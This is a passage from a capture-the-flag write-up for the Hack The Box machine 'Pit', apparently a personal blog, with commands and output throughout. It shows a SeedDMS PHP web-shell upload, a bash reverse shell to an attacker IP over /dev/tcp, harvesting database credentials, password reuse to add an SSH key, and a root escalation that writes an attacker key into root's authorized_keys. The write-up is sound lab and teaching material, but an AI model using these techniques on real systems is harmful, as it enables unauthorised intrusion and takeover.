    <li>I quickly find the password is michelle.  This would have been easy to guess.  With authentication to seeddms I take a closer look at the RCE exploit.  I download php/webapps/47022.txt from searchsploit.  It basically says I can upload a php reverse shell and access it in the location /data/1048576/"document_id"/1.php.  After logging in to http://dms-pit.htb/seeddms51x/seeddms with the credentials michelle:michelle I start poking around to see where I can upload the document.  I find in the directory Docs/Users/Michelle/ I get access to the menu that contains the option to "Add document".</li>

    <img src="../images/pit/seeddms.png">

    <br>
    <br>

    <li>Now I create a web shell file named shell.php and contains: <code>&lt;?php system($_REQUEST[&apos;cmd&apos;]) ?&gt;</code>.  With that file created on my kali machine I go to the "Add document" option, scroll down to the line that says "Local file:", then click on "Browse...".  I select the shell.php file from my kali machine.  Then scroll to the bottom of the page and select "Add document".  The file should be uploaded now.</li>

    <img src="../images/pit/shell_uploaded.png">

    <br>
    <br>

    <li>The exploit requires us to find the document ID for the shell file we uploaded.  By scrolling over the shell.php file link the tooltip pops up on the bottom of the web browser revealing the link "http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=29&showtree=1" which contains the document id of 29.  Using the directory given by the exploit I use curl and run the command <code>id</code>.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ curl http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=id&#13;&#10;uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0&#13;&#10;</pre>

    <li>We now have RCE.  The shell.php file gets deleted every so often, maybe every 10 minutes.  So I interecept the web request to upload the file with Burp and send that request to repeater.  That way I can easily upload the file again using burp.  Keep in mind each time you reupload shell.php it will have a different document id that you must upadte in your exploit command.  I also make the web request to http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=id using firefox and intercept that with burp as well and send the web request to repeater.  It is easier to url encode and send commands this way than with curl.</li>

    <br>

    <li>Now I setup a netcat listener on port 4444 and then send the command: <code>bash -c 'bash -i >& /dev/tcp/10.10.14.77/4444 0>&1'</code> using burp.  I have this command url encoded in burp.  In order to do this, you highlight the command and press <code>ctrl + u</code>.</li>

    <img src="../images/pit/burp.png">

    <br>
    <br>

    <li>I gain a reverse shell on my netcat listener.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit/nmap]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 4444                                                                                                2 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;Ncat: Connection from 10.129.95.189.&#13;&#10;Ncat: Connection from 10.129.95.189:53496.&#13;&#10;bash: cannot set terminal process group (3736): Inappropriate ioctl for device&#13;&#10;bash: no job control in this shell&#13;&#10;bash-4.4$ id&#13;&#10;id&#13;&#10;uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0&#13;&#10;bash-4.4$ &#13;&#10;</pre>

    <li>Every time the shell.php file gets deleted I also lose my shell.  So the saved burp requests (burp repeater) come in handy.  I simply send the burp request to upload the shell.php file.  Then I resend the reverse shell command using the other saved burp request (burp repeater).  Don't forget to update the document id number when doing this.</li>

    <br>

    <li>Once on the box I go up a few directories to /var/www/html/seeddms51x.  In this directory I find the folder conf in this directory and the file settings.xml inside of it (/var/www/html/seeddms51x/conf/settings.xml).  Inside this file I find credentials to the sql server.</li>

    <pre>    &lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&gt;&#13;&#10;    </pre>

    <br>
    <h2><a id="michelle">Shell - michelle</a></h2>

    <li>I connect to the sql server but do not find anything interesting.  I found the user table for seeddms that contained the user's hashes passwords but I was only able to crack michelle's.  This hash is for the password of "michelle" which we already know.  I am unable to find anything else interesting on the box at this time so I revisit the website on port 9090.  I am able to login to the web service using michelle as the username and ied^ieY6xoquu as the password.</li>

    <img src="../images/pit/cockpit_login.png">

    <br>
    <br>

    <li>Once logged in I select "Accounts" and then click on michelle.</li>

    <img src="../images/pit/cockpit_ssh.png">

    <br>
    <br>

    <li>Clicking on the + sign next to "Authorized Public SSH Keys" brings up a prompt that allows me to add a public ssh key.  So I generate my own SSH key pair in order to add the public key to this prompt.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ pwd                         &#13;&#10;/home/kali/Documents/htb2/Pit&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh-keygen                                  &#13;&#10;Generating public/private rsa key pair.&#13;&#10;Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/htb2/Pit/michelle_rsa&#13;&#10;Enter passphrase (empty for no passphrase): &#13;&#10;Enter same passphrase again: &#13;&#10;Your identification has been saved in /home/kali/Documents/htb2/Pit/michelle_rsa&#13;&#10;Your public key has been saved in /home/kali/Documents/htb2/Pit/michelle_rsa.pub&#13;&#10;The key fingerprint is:&#13;&#10;SHA256:SOMsbyqS8mm1hGrjmybI9TReUPxIu+70UmIhWqdrgJE kali@kali&#13;&#10;The key&apos;s randomart image is:&#13;&#10;+---[RSA 3072]----+&#13;&#10;|      .          |&#13;&#10;|       +         |&#13;&#10;|  .   = +        |&#13;&#10;| E   B B .       |&#13;&#10;|  o.+ O S        |&#13;&#10;| ..+o* = .       |&#13;&#10;|oo.o=.O.o        |&#13;&#10;|B=+..B.o.        |&#13;&#10;|*B=.o ....       |&#13;&#10;+----[SHA256]-----+&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ cat michelle_rsa.pub &#13;&#10;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC14xmfFrqmnypESRcXBJMYVJht9I+zCPczz52mSk7b5aOYOqP4fY8zfrhkJ8HEBjjz8XbilpB4L3StVuEOV4DpgAzyocFUzXzztrmPOHj61h68xxzGbDcMiZ32i9/V+lH9DngCsF8Whjkljn0UQH42Og4zRK2GorWnmNMVFqwtMsLjwwD2mxqkWApmqgjUdCD8a/3vs09AgSWIWghI1ZEaEDEJgYGL/VDfal47DKkVUtZaECJi4jXrXDVQrDs+ABLYuGcCNGHuRu71EKmAdZht9WG6Ik/wRLGsZ05KyHw7fTMFAMhni+ye8QQd6+3M2OrKi72lhNDxTJ5mtKDYhXWWoWiY+WB+aO1zbtrCkL+ZannXrUR9FjGjmDOMpqHajwe619gYAhcQrzTSkKT+A+gPSC/PSOC3ugNVc1R/ZTMhb5udVNwh+A093pSxQfBLY/EPic8QDDsRfwc/mpgfbgEKP1AZipuUmFImIdC3VVucTWTLgQfuZjMkgPXc4Nn4kVc= kali@kali&#13;&#10;</pre>

    <li>With the public key generate I copy the public key except for the kali@kali part and add it to the website.</li>

    <img src="../images/pit/cockpit_add_ssh.png">

    <br>
    <br>

    <li>After clicking "Add" I login as michelle using the SSH key.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh michelle@10.129.95.189 -i michelle_rsa                                                                 255 &Cross;&#13;&#10;Web console: https://pit.htb:9090/&#13;&#10;&#13;&#10;Last login: Fri Nov 19 14:15:39 2021&#13;&#10;[michelle@pit ~]$ id&#13;&#10;uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0&#13;&#10;[michelle@pit ~]$ &#13;&#10;</pre>
    
    <br>
    <h2><a id="root">Shell - root</a></h2>

    <li>As michelle I look the /usr/bin/monitor file that I saw in the output from snmpwalk.</li>

    <pre>[michelle@pit ~]$ ls -la /usr/bin/monitor &#13;&#10;-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor&#13;&#10;</pre>

    <li>I have read access to this file so I use cat against it see what I can see.</li>

    <pre>[michelle@pit ~]$ cat /usr/bin/monitor&#13;&#10;#!/bin/bash&#13;&#10;&#13;&#10;for script in /usr/local/monitoring/check*sh&#13;&#10;do&#13;&#10;    /bin/bash $script&#13;&#10;done</pre>

    <li>It appears the file is executing all scripts in the /usr/local/monitoring directory with the name check*sh.  The * is working as a wildcard, so any script with a name fitting that pattern will be executed.  I am assuming this file is being ran by root based on the fact that it is owned by root and only executable by root.  So I attempt to navigate to /usr/local/monitoring in order to create the script.  When I change directories to the /usr/local/monitoring I am unable to list the contents of the directory.</li>

    <pre>[michelle@pit ~]$ cd /usr/local/monitoring/&#13;&#10;[michelle@pit monitoring]$ ls -la&#13;&#10;ls: cannot open directory &apos;.&apos;: Permission denied&#13;&#10;</pre>

    <li>Since I am unable to list the contents of the directory, which is strange, I back down one level to the /usr/local directory and use <code>ls -lad</code> against the monitoring folder to see what the permissions look like since it is acting strange.</li>

    <pre>[michelle@pit local]$ pwd&#13;&#10;/usr/local&#13;&#10;[michelle@pit local]$ ls -lad monitoring/&#13;&#10;drwxrwx---+ 2 root root 138 Nov 19 14:35 monitoring/&#13;&#10;</pre>

    <li>The basic permissions on this file show that I have no permissions michelle.  However, there is a + sign on the right of the permissions which means there are extended permissions on this folder which is a feature of selinux.  I use the command <code>getfacls</code> against it to view the extended permissions.</li>

    <pre>[michelle@pit local]$ getfacl monitoring/&#13;&#10;# file: monitoring/&#13;&#10;# owner: root&#13;&#10;# group: root&#13;&#10;user::rwx&#13;&#10;user:michelle:-wx&#13;&#10;group::rwx&#13;&#10;mask::rwx&#13;&#10;other::---</pre>

    <li>michelle has extended permissions which allow us to write and execute to the monitoring directory but we cannot read from the directory.  This explains the strange behavior.  At this point I use echo to create a script in the monitoring directory to add a ssh key to the root user.  I name it "check1sh" because that matches the pattern of check*sh, which the /usr/bin/monitor file is searching for.  First I create the root ssh key.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh-keygen                                 &#13;&#10;Generating public/private rsa key pair.&#13;&#10;Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/htb2/Pit/root_rsa&#13;&#10;Enter passphrase (empty for no passphrase): &#13;&#10;Enter same passphrase again: &#13;&#10;Your identification has been saved in /home/kali/Documents/htb2/Pit/root_rsa&#13;&#10;Your public key has been saved in /home/kali/Documents/htb2/Pit/root_rsa.pub&#13;&#10;The key fingerprint is:&#13;&#10;SHA256:Q9HmHp/I0FD7VwS1pg9ROR8U2d24f/59W1bEAQFw5JQ kali@kali&#13;&#10;The key&apos;s randomart image is:&#13;&#10;+---[RSA 3072]----+&#13;&#10;|        .++=oo=OX|&#13;&#10;|        ..*E  oB*|&#13;&#10;|        .=.. . +B|&#13;&#10;|       .. +.  =o.|&#13;&#10;|        S+ +.+...|&#13;&#10;|         .+ o.o +|&#13;&#10;|               o+|&#13;&#10;|               .=|&#13;&#10;|               .*|&#13;&#10;+----[SHA256]-----+&#13;&#10;</pre>

    <li>Now I copy the contents of the root public key I generated.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ cat root_rsa.pub                                                                                           130 &Cross;&#13;&#10;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQXF2b+M7wNJareW2ak2gRJBhsJoylV6pEpBUVFYw/lp+UulaPalJm4iF6AN5l8294JDz5AUx2kPuiPffItasi0RXDbx8XaJwWIzSyTHC9iNNiEzVbaRD2fOGSPNBA2P4R95zlyGNsjzyBDSBXtpM1uUrcczDuonYwXXyY3upYkJ0bCg/3+IJCcBiNIR2szp//6+8T4Qh2jS+eK4x6s7xwOzA2i5H5xByIDXpdVXFPub+U1kIUHgaYLTbYlu+5iPTDUjMwGQa0EnWl0Y3iLMXnDSWK1MVDp86nQy384H7LBjHDbMbz6ob6iERH23ytumIW/l9ju5X1PONeixQ/+r468msqR2FZfbmR0nCPgsnIwNuVtT2qovWSDc7YaX4Y/xRT14gh3AyjbKa5jH8wsdgLLIazeL3qH5mPsBLyjQlEiU0qeqn2WUGz0hWZ0j3mC8ez3uzYOnzRpykUWHrTQjO23GawGH6s/P3o7KEdLWaw6AbFcYYQaZoiwH2ba8vkowE= kali@kali&#13;&#10;</pre>

    <li>Then I use the echo command to create the script that will add the public key to the root users authorized_keys file.</li>

    <pre>echo &quot;echo &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQXF2b+M7wNJareW2ak2gRJBhsJoylV6pEpBUVFYw/lp+UulaPalJm4iF6AN5l8294JDz5AUx2kPuiPffItasi0RXDbx8XaJwWIzSyTHC9iNNiEzVbaRD2fOGSPNBA2P4R95zlyGNsjzyBDSBXtpM1uUrcczDuonYwXXyY3upYkJ0bCg/3+IJCcBiNIR2szp//6+8T4Qh2jS+eK4x6s7xwOzA2i5H5xByIDXpdVXFPub+U1kIUHgaYLTbYlu+5iPTDUjMwGQa0EnWl0Y3iLMXnDSWK1MVDp86nQy384H7LBjHDbMbz6ob6iERH23ytumIW/l9ju5X1PONeixQ/+r468msqR2FZfbmR0nCPgsnIwNuVtT2qovWSDc7YaX4Y/xRT14gh3AyjbKa5jH8wsdgLLIazeL3qH5mPsBLyjQlEiU0qeqn2WUGz0hWZ0j3mC8ez3uzYOnzRpykUWHrTQjO23GawGH6s/P3o7KEdLWaw6AbFcYYQaZoiwH2ba8vkowE=&apos; &gt; /root/.ssh/authorized_keys&quot; &gt; /usr/local/monitoring/checkxsh</pre>

    <li>With the script in place I now execute the /usr/bin/monitor executable using snmp.  I can either run snmpwalk just as I did before and fully enumerate everything again.  Or I can specify the OID for /usr/bin/monitor and trigger the monitor executable immediately.  The box is running a script that clears everything in the /usr/local/monitoring directory somewhat frequently so you will want to make sure the script you create in that folder is not cleared by the system before you get a chance to execute it.</li>

    <br>

    <li>I find the OID for /usr/bin/monitor</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ cat snmpwalk.out| grep monitor                                                                                                                                                                                                      130 &Cross;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: &quot;/usr/bin/monitor&quot;&#13;&#10;</pre>

    <li>I execute it using snmpwalk</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ snmpwalk -v 1 -c public 10.129.95.189 iso.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103                                                                                                                       1 &Cross;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: &quot;Memory usage&#13;&#10;              total        used        free      shared  buff/cache   available&#13;&#10;Mem:          3.8Gi       394Mi       3.1Gi       8.0Mi       345Mi       3.2Gi&#13;&#10;Swap:         1.9Gi          0B       1.9Gi&#13;&#10;Database status&#13;&#10;OK - Connection to database successful.&#13;&#10;System release info&#13;&#10;CentOS Linux release 8.3.2011&#13;&#10;SELinux Settings&#13;&#10;user&#13;&#10;&#13;&#10;                Labeling   MLS/       MLS/                          &#13;&#10;SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles&#13;&#10;&#13;&#10;guest_u         user       s0         s0                             guest_r&#13;&#10;root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r&#13;&#10;staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r&#13;&#10;sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r&#13;&#10;system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r&#13;&#10;unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r&#13;&#10;user_u          user       s0         s0                             user_r&#13;&#10;xguest_u        user       s0         s0                             xguest_r&#13;&#10;login&#13;&#10;&#13;&#10;Login Name           SELinux User         MLS/MCS Range        Service&#13;&#10;&#13;&#10;__default__          unconfined_u         s0-s0:c0.c1023       *&#13;&#10;michelle             user_u               s0                   *&#13;&#10;root                 unconfined_u         s0-s0:c0.c1023       *&#13;&#10;System uptime&#13;&#10; 15:01:38 up  5:17,  2 users,  load average: 0.00, 0.00, 0.00&quot;&#13;&#10;</pre>

    <li>Finally, I am able to connect to the box as root using the ssh key.</li>

    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh root@10.129.95.189 -i root_rsa                             &#13;&#10;Web console: https://pit.htb:9090/&#13;&#10;&#13;&#10;Last login: Mon Jul 26 09:15:10 2021&#13;&#10;[root@pit ~]# &#13;&#10;</pre>
    
</body>
</html>

